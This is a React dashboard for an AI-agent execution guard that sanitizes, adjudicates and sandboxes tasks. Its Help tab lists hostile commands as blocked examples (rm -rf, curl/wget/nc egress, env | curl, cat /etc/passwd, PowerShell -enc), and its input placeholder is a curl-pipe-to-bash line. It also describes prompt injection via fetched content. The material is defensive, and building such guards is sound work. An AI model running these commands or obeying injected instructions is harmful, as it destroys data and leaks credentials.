import { useState, useEffect, useCallback } from "react";
import {
  Shield,
  Gavel,
  Wrench,
  Activity,
  CheckCircle,
  XCircle,
  AlertTriangle,
  RefreshCw,
  Play,
  Clock,
  GitBranch,
  HelpCircle,
  BookOpen,
  Zap,
  Lock,
  Eye,
} from "lucide-react";
import axios from "axios";

const API = "http://localhost:10956";

interface HealthData {
  status: string;
  uptime_seconds: number;
  services: Record<string, string>;
  adjudication_log_count: number;
}

interface AuditEntry {
  timestamp: string;
  content_hash?: string;
  content: string;
  verdict: string;
  rationale: string;
  sanitize_score: number;
}

type Tab = "pipeline" | "audit" | "help";

function ServiceBadge({ name, status }: { name: string; status: string }) {
  const ok = status === "healthy";
  return (
    <div
      className={`flex items-center gap-2 px-3 py-2 rounded border text-sm ${
        ok
          ? "border-green-500/20 bg-green-500/5 text-green-300"
          : "border-red-500/20 bg-red-500/5 text-red-300"
      }`}
    >
      {ok ? <CheckCircle className="w-4 h-4 shrink-0" /> : <XCircle className="w-4 h-4 shrink-0" />}
      <span className="font-medium capitalize">{name}</span>
      <span className="ml-auto text-xs opacity-60">{status}</span>
    </div>
  );
}

function PipelineStage({
  icon: Icon,
  label,
  sublabel,
  port,
  active,
  index,
}: {
  icon: React.ComponentType<{ className?: string }>;
  label: string;
  sublabel: string;
  port: number;
  active: boolean;
  index: number;
}) {
  return (
    <div className="flex items-center gap-2">
      <div
        className={`flex flex-col items-center gap-1.5 p-4 rounded-lg border flex-1 transition-colors ${
          active ? "border-blue-500/30 bg-blue-500/5" : "border-zinc-800 bg-zinc-900"
        }`}
      >
        <Icon className={`w-6 h-6 ${active ? "text-blue-400" : "text-zinc-600"}`} />
        <span className="text-sm font-semibold">{label}</span>
        <span className="text-xs text-zinc-500">{sublabel}</span>
        <span className="text-xs text-zinc-600">:{port}</span>
      </div>
      {index < 2 && (
        <div className="text-zinc-600 text-lg select-none shrink-0">→</div>
      )}
    </div>
  );
}

function VerdictIcon({ verdict }: { verdict: string }) {
  return verdict === "approve" ? (
    <CheckCircle className="w-3.5 h-3.5 text-green-400 shrink-0 mt-0.5" />
  ) : (
    <AlertTriangle className="w-3.5 h-3.5 text-red-400 shrink-0 mt-0.5" />
  );
}

// ── Help content ────────────────────────────────────────────────────────────

function HelpSection({ icon: Icon, title, children }: {
  icon: React.ComponentType<{ className?: string }>;
  title: string;
  children: React.ReactNode;
}) {
  return (
    <div className="border border-zinc-800 rounded-lg overflow-hidden">
      <div className="flex items-center gap-2 px-4 py-3 bg-zinc-900 border-b border-zinc-800">
        <Icon className="w-4 h-4 text-blue-400" />
        <h3 className="text-sm font-semibold">{title}</h3>
      </div>
      <div className="p-4 text-sm text-zinc-300 space-y-2">{children}</div>
    </div>
  );
}

function Code({ children }: { children: string }) {
  return (
    <code className="px-1.5 py-0.5 rounded bg-zinc-800 text-zinc-300 text-xs font-mono">
      {children}
    </code>
  );
}

function HelpTab() {
  return (
    <div className="space-y-4">
      <HelpSection icon={Shield} title="What DeepFang Does">
        <p>
          DeepFang screens every AI agent task through a three-stage pipeline before anything runs on
          your machine. It sits between the agent and execution, blocking dangerous or unexpected tasks.
        </p>
        <p className="text-zinc-400">
          Stage 1 — <span className="text-zinc-200 font-medium">Sanitizer</span> — fast regex scan
          (&lt;5ms). Catches known dangerous patterns: destructive commands, network egress,
          credential theft, encoded payloads.
        </p>
        <p className="text-zinc-400">
          Stage 2 — <span className="text-zinc-200 font-medium">Adjudicator</span> — DeepSeek-V4-Pro
          reads the task in context and classifies intent as approve or deny with a written
          rationale. Only runs if Stage 1 didn't already block it.
        </p>
        <p className="text-zinc-400">
          Stage 3 — <span className="text-zinc-200 font-medium">Worker</span> — air-gapped Docker
          container. No internet access at the network layer (not a software policy — a Docker{" "}
          <Code>internal: true</Code> network constraint). Runs approved tasks against your local
          Git repos.
        </p>
      </HelpSection>

      <HelpSection icon={Lock} title="What Gets Blocked">
        <div className="space-y-1.5">
          {[
            ["Destructive filesystem ops", "rm -rf, del /f, format, dd if="],
            ["Network egress", "curl, wget, Invoke-WebRequest, nc, ncat"],
            ["Credential exfiltration", "cat /etc/passwd, env | curl, net user /add"],
            ["Code injection", "eval(), exec(), __import__, backtick substitution"],
            ["Privilege escalation", "sudo, dangerous chmod/chown"],
            ["Encoded payloads", "PowerShell -enc, piped base64 decode"],
          ].map(([label, example]) => (
            <div key={label} className="flex gap-3">
              <XCircle className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
              <div>
                <span className="font-medium text-zinc-200">{label}</span>
                <span className="text-zinc-500 ml-2 text-xs">{example}</span>
              </div>
            </div>
          ))}
        </div>
      </HelpSection>

      <HelpSection icon={CheckCircle} title="What Gets Approved">
        <div className="space-y-1.5">
          {[
            ["Git operations", "git add, commit, push, pull, clone, log, diff"],
            ["Package managers", "uv pip install, npm install, cargo build"],
            ["File operations", "mkdir, cp, mv, New-Item, Write-Content"],
            ["Build tools", "cargo build, go test, python -m pytest"],
            ["Safe inspection", "git status, git log, cat (non-sensitive files)"],
          ].map(([label, example]) => (
            <div key={label} className="flex gap-3">
              <CheckCircle className="w-4 h-4 text-green-400 shrink-0 mt-0.5" />
              <div>
                <span className="font-medium text-zinc-200">{label}</span>
                <span className="text-zinc-500 ml-2 text-xs">{example}</span>
              </div>
            </div>
          ))}
        </div>
      </HelpSection>

      <HelpSection icon={Zap} title="Attack Vectors Mitigated">
        <div className="space-y-3">
          {[
            {
              name: "Prompt injection via fetched content",
              desc: "Malicious instructions hidden in web pages, documents, or API responses that an agent fetches. Stage 1 catches the injected command; Stage 3 network-isolates execution.",
            },
            {
              name: "Destructive command scope errors",
              desc: "Agent generates rm -rf / instead of rm -rf ./build. Hard-blocked by Stage 1 regex rules before the command ever runs.",
            },
            {
              name: "Credential exfiltration",
              desc: "Tasks that read ~/.env or /etc/passwd and pipe to an external service. Stage 1 blocks the pattern; Stage 3 makes exfiltration physically impossible (no WAN).",
            },
            {
              name: "Chained attacks (many safe steps, one dangerous)",
              desc: "Stage 1 evaluates the full task content, not just the first or last line. Stage 2 reads the complete task for semantic intent.",
            },
            {
              name: "Encoded / obfuscated payloads",
              desc: "PowerShell -enc with long base64, piped base64 decode patterns. Caught by Stage 1 pattern matching.",
            },
          ].map(({ name, desc }) => (
            <div key={name}>
              <p className="font-medium text-zinc-200">{name}</p>
              <p className="text-zinc-500 text-xs mt-0.5">{desc}</p>
            </div>
          ))}
        </div>
        <p className="text-zinc-500 text-xs mt-2 pt-2 border-t border-zinc-800">
          See <span className="text-zinc-400">docs/ATTACK_VECTORS.md</span> for full detail on each vector.
        </p>
      </HelpSection>

      <HelpSection icon={BookOpen} title="MCP Tools">
        <div className="space-y-2">
          {[
            ["deepfang_pipeline", "Full pipeline in one call — the main entry point for agents"],
            ["deepfang_sanitize", "Stage 1 only — fast regex scan, returns threat score"],
            ["deepfang_adjudicate", "Stage 2 only — LLM verdict with rationale"],
            ["deepfang_dispatch", "Stage 3 only — requires prior approval in audit log"],
            ["deepfang_audit", "Query the adjudication log"],
            ["deepfang_status", "Health check across all pipeline services"],
            ["deepfang_agentic_workflow", "Multi-step goal via FastMCP 3.2 sampling"],
          ].map(([tool, desc]) => (
            <div key={tool} className="flex gap-2">
              <Code>{tool}</Code>
              <span className="text-zinc-400 text-xs self-center">{desc}</span>
            </div>
          ))}
        </div>
        <p className="text-zinc-500 text-xs mt-3 pt-2 border-t border-zinc-800">
          Connect at <Code>http://localhost:10956/sse</Code> from Claude Desktop or any MCP client.
        </p>
      </HelpSection>

      <HelpSection icon={Eye} title="Failure Modes (all fail-closed)">
        <div className="space-y-1.5 text-xs">
          {[
            ["Sanitizer unreachable", "Pipeline stops — nothing proceeds"],
            ["DeepSeek API timeout", "Returns deny — task blocked"],
            ["DeepSeek API key not set", "Returns deny (UNCONFIGURED) — all tasks blocked"],
            ["Worker unreachable", "Dispatch returns error — task not executed"],
            ["DeepFang stack down (in RoboFang)", "High-risk tool calls blocked until stack restarts"],
          ].map(([failure, behaviour]) => (
            <div key={failure} className="flex gap-3">
              <AlertTriangle className="w-3.5 h-3.5 text-yellow-500 shrink-0 mt-0.5" />
              <div>
                <span className="text-zinc-300">{failure}</span>
                <span className="text-zinc-500 ml-2">{behaviour}</span>
              </div>
            </div>
          ))}
        </div>
      </HelpSection>
    </div>
  );
}

// ── Main App ────────────────────────────────────────────────────────────────

export default function App() {
  const [tab, setTab] = useState<Tab>("pipeline");
  const [health, setHealth] = useState<HealthData | null>(null);
  const [auditLog, setAuditLog] = useState<AuditEntry[]>([]);
  const [input, setInput] = useState("");
  const [result, setResult] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  const fetchHealth = useCallback(async () => {
    try {
      const { data } = await axios.get<HealthData>(`${API}/health`);
      setHealth(data);
    } catch {
      setHealth(null);
    }
  }, []);

  const fetchAudit = useCallback(async () => {
    try {
      const { data } = await axios.get(`${API}/api/audit?limit=30`);
      setAuditLog(data.entries || []);
    } catch {
      // ignore
    }
  }, []);

  useEffect(() => {
    fetchHealth();
    fetchAudit();
    const i = setInterval(fetchHealth, 5000);
    return () => clearInterval(i);
  }, [fetchHealth, fetchAudit]);

  const runPipeline = async () => {
    if (!input.trim()) return;
    setLoading(true);
    setResult(null);
    try {
      const { data } = await axios.post(`${API}/api/pipeline`, {
        content: input,
        source: "dashboard",
      });
      setResult(JSON.stringify(data, null, 2));
      fetchAudit();
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : String(e);
      setResult(`Error: ${msg}`);
    } finally {
      setLoading(false);
    }
  };

  const overallHealthy = health?.status === "healthy";
  const services = health?.services ?? {};

  return (
    <div className="min-h-screen bg-zinc-950 text-zinc-200">
      <div className="max-w-5xl mx-auto p-6 space-y-5">

        {/* Header */}
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <GitBranch className="w-8 h-8 text-blue-400" />
            <div>
              <h1 className="text-2xl font-bold tracking-tight">DeepFang</h1>
              <p className="text-xs text-zinc-500">Execution isolation stack · Goliath</p>
            </div>
          </div>
          <div className="flex items-center gap-3">
            <span
              className={`flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-medium border ${
                overallHealthy
                  ? "bg-green-500/10 text-green-400 border-green-500/20"
                  : "bg-yellow-500/10 text-yellow-400 border-yellow-500/20"
              }`}
            >
              <Activity className="w-3 h-3" />
              {health ? health.status : "offline"}
            </span>
            <button
              onClick={() => { fetchHealth(); fetchAudit(); }}
              className="p-2 rounded hover:bg-zinc-800 text-zinc-400 transition-colors"
              title="Refresh"
            >
              <RefreshCw className="w-4 h-4" />
            </button>
          </div>
        </div>

        {/* Pipeline visualization */}
        <div className="grid grid-cols-5 gap-1 items-center">
          <PipelineStage
            icon={Shield}
            label="Sanitizer"
            sublabel="Regex · threat score"
            port={10958}
            active={services.zeroclaw === "healthy" || services.sanitizer === "healthy"}
            index={0}
          />
          <PipelineStage
            icon={Gavel}
            label="Adjudicator"
            sublabel="DeepSeek-V4-Pro"
            port={10959}
            active={services.deepseek === "healthy"}
            index={1}
          />
          <PipelineStage
            icon={Wrench}
            label="Worker"
            sublabel="Air-gapped · no WAN"
            port={10960}
            active={services.moltbot === "healthy" || services.worker === "healthy"}
            index={2}
          />
        </div>

        {/* Service badges */}
        {Object.keys(services).length > 0 && (
          <div className="flex gap-2 flex-wrap">
            {Object.entries(services).map(([name, status]) => (
              <ServiceBadge key={name} name={name} status={String(status)} />
            ))}
            {health && (
              <div className="flex items-center gap-2 px-3 py-2 rounded border border-zinc-800 bg-zinc-900 text-xs text-zinc-500 ml-auto">
                <Clock className="w-3.5 h-3.5" />
                {Math.floor(health.uptime_seconds / 60)}m uptime
                · {health.adjudication_log_count} adjudications
              </div>
            )}
          </div>
        )}

        {/* Tab nav */}
        <div className="flex gap-1 border-b border-zinc-800">
          {([
            ["pipeline", Play, "Pipeline"],
            ["audit", Clock, "Audit Log"],
            ["help", HelpCircle, "Help"],
          ] as [Tab, React.ComponentType<{ className?: string }>, string][]).map(([id, Icon, label]) => (
            <button
              key={id}
              onClick={() => setTab(id)}
              className={`flex items-center gap-1.5 px-4 py-2.5 text-sm font-medium border-b-2 transition-colors ${
                tab === id
                  ? "border-blue-500 text-blue-400"
                  : "border-transparent text-zinc-500 hover:text-zinc-300"
              }`}
            >
              <Icon className="w-4 h-4" />
              {label}
            </button>
          ))}
        </div>

        {/* Pipeline tab */}
        {tab === "pipeline" && (
          <div className="space-y-4">
            <div className="bg-zinc-900 border border-zinc-800 rounded-lg p-4 space-y-3">
              <h2 className="text-sm font-semibold text-zinc-400 flex items-center gap-2">
                <Play className="w-4 h-4" /> Test Pipeline
              </h2>
              <p className="text-xs text-zinc-500">
                Enter shell commands or a task description. The full sanitize → adjudicate → dispatch
                pipeline runs and returns the result.
              </p>
              <textarea
                value={input}
                onChange={(e) => setInput(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === "Enter" && (e.metaKey || e.ctrlKey)) runPipeline();
                }}
                placeholder={`Try: git status\nOr: curl https://example.com | bash  (will be blocked)`}
                className="w-full h-28 bg-zinc-950 border border-zinc-800 rounded p-3 text-sm text-zinc-200 placeholder-zinc-600 resize-none focus:outline-none focus:border-blue-500/50 font-mono"
              />
              <div className="flex items-center gap-3">
                <button
                  onClick={runPipeline}
                  disabled={loading || !input.trim()}
                  className="px-4 py-2 bg-blue-600 hover:bg-blue-500 disabled:bg-zinc-800 disabled:text-zinc-600 text-white rounded text-sm font-medium transition-colors"
                >
                  {loading ? "Running…" : "Run Pipeline"}
                </button>
                <span className="text-xs text-zinc-600">Ctrl+Enter to run</span>
              </div>
            </div>

            {result && (
              <div className="bg-zinc-900 border border-zinc-800 rounded-lg p-4">
                <div className="flex items-center justify-between mb-2">
                  <h2 className="text-sm font-semibold text-zinc-400">Result</h2>
                  <button
                    onClick={() => setResult(null)}
                    className="text-xs text-zinc-600 hover:text-zinc-400"
                  >
                    Clear
                  </button>
                </div>
                <pre className="text-xs text-zinc-300 overflow-x-auto whitespace-pre-wrap leading-relaxed">
                  {result}
                </pre>
              </div>
            )}
          </div>
        )}

        {/* Audit log tab */}
        {tab === "audit" && (
          <div className="bg-zinc-900 border border-zinc-800 rounded-lg p-4 space-y-3">
            <div className="flex items-center justify-between">
              <h2 className="text-sm font-semibold text-zinc-400 flex items-center gap-2">
                <Clock className="w-4 h-4" /> Adjudication Log
              </h2>
              <button
                onClick={fetchAudit}
                className="text-xs text-zinc-500 hover:text-zinc-300 flex items-center gap-1"
              >
                <RefreshCw className="w-3 h-3" /> Refresh
              </button>
            </div>
            {auditLog.length === 0 ? (
              <p className="text-xs text-zinc-600 py-4 text-center">
                No adjudications yet. Run a task through the Pipeline tab.
              </p>
            ) : (
              <div className="space-y-1.5 max-h-[60vh] overflow-y-auto">
                {[...auditLog].reverse().map((entry, i) => (
                  <div
                    key={i}
                    className="flex items-start gap-3 p-3 rounded bg-zinc-950 border border-zinc-800 text-xs"
                  >
                    <VerdictIcon verdict={entry.verdict} />
                    <div className="flex-1 min-w-0 space-y-0.5">
                      <div className="flex items-center gap-2">
                        <span
                          className={`font-semibold ${
                            entry.verdict === "approve" ? "text-green-400" : "text-red-400"
                          }`}
                        >
                          {entry.verdict.toUpperCase()}
                        </span>
                        {entry.sanitize_score != null && (
                          <span className="text-zinc-600">
                            score {entry.sanitize_score.toFixed(2)}
                          </span>
                        )}
                        {entry.content_hash && (
                          <span className="text-zinc-700 font-mono">{entry.content_hash}</span>
                        )}
                      </div>
                      <p className="text-zinc-300 font-mono truncate">{entry.content}</p>
                      {entry.rationale && (
                        <p className="text-zinc-500">{entry.rationale.slice(0, 120)}</p>
                      )}
                    </div>
                    <span className="text-zinc-600 shrink-0 tabular-nums">
                      {entry.timestamp?.slice(11, 19)}
                    </span>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Help tab */}
        {tab === "help" && <HelpTab />}

      </div>
    </div>
  );
}
